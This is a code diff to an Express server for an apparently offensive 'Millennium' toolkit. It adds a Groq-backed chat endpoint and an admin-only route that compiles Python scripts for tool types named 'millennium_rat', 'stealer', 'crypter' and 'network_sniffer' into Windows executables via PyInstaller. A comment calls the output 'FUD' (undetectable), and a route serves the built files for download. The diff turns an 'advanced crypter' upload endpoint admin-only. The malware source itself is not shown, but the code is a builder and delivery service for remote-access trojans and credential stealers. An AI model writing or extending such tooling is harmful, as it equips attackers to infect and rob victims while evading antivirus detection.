@@ -1,4 +1,4 @@
-import { type Express } from "express";
+import { type Express, type Request, type Response, type NextFunction } from "express";
 import { createServer, type Server } from "node:http";
 import { storage } from "./storage";
 import multer from "multer";
@@ -6,6 +6,10 @@ import fs from "fs";
 import path from "path";
 import crypto from "crypto";
 import { spawn } from "child_process";
+
+interface AuthenticatedRequest extends Request {
+  session?: any;
+}
 
 function getSession() {
   // Placeholder session function
@@ -73,7 +77,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         protocol: protocol || 'HTTP',
         port: port || 80,
         payload: payload || '',
-        timestamp: new Date()
+        size: payload ? payload.length : 0
       });
 
       res.json({ success: true, packetLog });
@@ -102,8 +106,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       const analytics = await storage.createAnalytics({
         metric: metric || 'unknown',
-        value: value || '{}',
-        timestamp: new Date()
+        value: value || '{}'
       });
 
       res.json({ success: true, analytics });
@@ -163,17 +166,45 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // AI Chat endpoint for Millennium AI
+  // AI Chat endpoint for Groq AI integration
   app.post("/api/millennium-ai", async (req, res) => {
     try {
       const { prompt } = req.body;
       
-      // For now, return a placeholder response since no AI API key is configured
-      const response = `Educational cybersecurity response for: "${prompt}"\n\nThis is a simulated AI response. To enable real AI functionality, please provide your API key through the admin panel.`;
+      if (!process.env.GROQ_API_KEY) {
+        return res.status(400).json({ error: 'Groq API key not configured' });
+      }
+
+      const groqResponse = await fetch('https://api.groq.com/openai/v1/chat/completions', {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${process.env.GROQ_API_KEY}`,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          model: 'mixtral-8x7b-32768',
+          messages: [{
+            role: 'system',
+            content: 'You are a cybersecurity expert assistant. Provide educational and ethical guidance only. Always emphasize legal and authorized testing environments.'
+          }, {
+            role: 'user',
+            content: prompt
+          }],
+          max_tokens: 1024,
+          temperature: 0.7
+        })
+      });
+
+      if (!groqResponse.ok) {
+        throw new Error(`Groq API error: ${groqResponse.status}`);
+      }
+
+      const groqData = await groqResponse.json();
+      const response = groqData.choices[0]?.message?.content || 'No response generated';
       
       await storage.createAnalytics({
         metric: 'ai_chat_usage',
-        value: JSON.stringify({ prompt, timestamp: new Date().toISOString() })
+        value: JSON.stringify({ prompt: prompt.substring(0, 100), response: response.substring(0, 100), timestamp: new Date().toISOString() })
       });
 
       res.json({ response });
@@ -219,7 +250,207 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Advanced crypter endpoint with multer for file upload
+  // Admin authentication middleware
+  function requireAdmin(req: any, res: any, next: any) {
+    // Check session for admin authentication
+    if (!req.session?.userId) {
+      return res.status(401).json({ error: 'Admin authentication required' });
+    }
+    next();
+  }
+
+  // Python toolkit executable builder - ADMIN ONLY
+  app.post("/api/admin/build-executable", requireAdmin, async (req, res) => {
+    try {
+      const { toolType, config } = req.body;
+      
+      if (!['elite_toolkit', 'millennium_rat', 'crypter', 'stealer', 'network_sniffer'].includes(toolType)) {
+        return res.status(400).json({ error: 'Invalid tool type' });
+      }
+
+      const buildId = crypto.randomUUID();
+      const buildDir = path.join('builds', buildId);
+      
+      // Ensure build directory exists
+      fs.mkdirSync(buildDir, { recursive: true });
+      
+      // Copy appropriate Python script
+      const scriptMap = {
+        'elite_toolkit': 'elite_toolkit.py',
+        'millennium_rat': 'millennium_rat_toolkit.py',
+        'crypter': 'build_toolkit.py',
+        'stealer': 'elite_toolkit.py',
+        'network_sniffer': 'millennium_rat_toolkit.py'
+      };
+      
+      const sourcePath = path.join('python_tools', scriptMap[toolType]);
+      const targetPath = path.join(buildDir, 'main.py');
+      
+      if (!fs.existsSync(sourcePath)) {
+        return res.status(404).json({ error: 'Python tool not found' });
+      }
+      
+      fs.copyFileSync(sourcePath, targetPath);
+      
+      // Create PyInstaller spec file for FUD executable
+      const specContent = `
+# -*- mode: python ; coding: utf-8 -*-
+
+block_cipher = None
+
+a = Analysis(
+    ['main.py'],
+    pathex=[],
+    binaries=[],
+    datas=[],
+    hiddenimports=[
+        'cryptography',
+        'requests',
+        'socket',
+        'threading',
+        'subprocess',
+        'os',
+        'sys',
+        'base64',
+        'json',
+        'time',
+        'random',
+        'hashlib',
+        'sqlite3',
+        'win32api',
+        'win32con',
+        'win32gui',
+        'win32process',
+        'psutil',
+        'PIL',
+        'cv2'
+    ],
+    hookspath=[],
+    hooksconfig={},
+    runtime_hooks=[],
+    excludes=[],
+    win_no_prefer_redirects=False,
+    win_private_assemblies=False,
+    cipher=block_cipher,
+    noarchive=False,
+)
+
+pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
+
+exe = EXE(
+    pyz,
+    a.scripts,
+    a.binaries,
+    a.zipfiles,
+    a.datas,
+    [],
+    name='${config.outputName || 'security_tool'}',
+    debug=False,
+    bootloader_ignore_signals=False,
+    strip=False,
+    upx=${config.compression ? 'True' : 'False'},
+    upx_exclude=[],
+    runtime_tmpdir=None,
+    console=${config.console ? 'True' : 'False'},
+    disable_windowed_traceback=False,
+    argv_emulation=False,
+    target_arch=None,
+    codesign_identity=None,
+    entitlements_file=None,
+    icon='${config.icon || 'None'}',
+    version_file=None,
+)
+`;
+      
+      const specPath = path.join(buildDir, 'build.spec');
+      fs.writeFileSync(specPath, specContent);
+      
+      // Execute PyInstaller build
+      const pyinstallerProcess = spawn('pyinstaller', [
+        '--clean',
+        '--onefile',
+        '--noconsole',
+        '--add-data', 'python_tools;.',
+        specPath
+      ], {
+        cwd: buildDir,
+        stdio: 'pipe'
+      });
+      
+      let buildOutput = '';
+      pyinstallerProcess.stdout?.on('data', (data) => {
+        buildOutput += data.toString();
+      });
+      
+      pyinstallerProcess.stderr?.on('data', (data) => {
+        buildOutput += data.toString();
+      });
+      
+      pyinstallerProcess.on('close', (code) => {
+        if (code === 0) {
+          const exePath = path.join(buildDir, 'dist', `${config.outputName || 'security_tool'}.exe`);
+          
+          res.json({
+            success: true,
+            buildId,
+            executable: exePath,
+            buildLog: buildOutput,
+            downloadUrl: `/api/admin/download-executable/${buildId}`
+          });
+        } else {
+          res.status(500).json({
+            error: 'Build failed',
+            buildLog: buildOutput
+          });
+        }
+      });
+      
+      // Log admin action
+      await storage.createAnalytics({
+        metric: 'admin_executable_build',
+        value: JSON.stringify({
+          toolType,
+          config,
+          buildId,
+          adminId: req.session.userId,
+          timestamp: new Date().toISOString()
+        })
+      });
+      
+    } catch (error) {
+      console.error('Error building executable:', error);
+      res.status(500).json({ error: 'Build process failed' });
+    }
+  });
+
+  // Download built executable - ADMIN ONLY
+  app.get("/api/admin/download-executable/:buildId", requireAdmin, (req, res) => {
+    try {
+      const { buildId } = req.params;
+      const buildDir = path.join('builds', buildId);
+      const distDir = path.join(buildDir, 'dist');
+      
+      if (!fs.existsSync(distDir)) {
+        return res.status(404).json({ error: 'Build not found' });
+      }
+      
+      const files = fs.readdirSync(distDir);
+      const exeFile = files.find(f => f.endsWith('.exe'));
+      
+      if (!exeFile) {
+        return res.status(404).json({ error: 'Executable not found' });
+      }
+      
+      const exePath = path.join(distDir, exeFile);
+      res.download(exePath, exeFile);
+      
+    } catch (error) {
+      console.error('Error downloading executable:', error);
+      res.status(500).json({ error: 'Download failed' });
+    }
+  });
+
+  // Advanced crypter endpoint with multer for file upload - ADMIN ONLY
   const upload = multer({ dest: 'temp/' });
   
   app.post("/api/advanced-crypter", upload.single('file'), async (req, res) => {
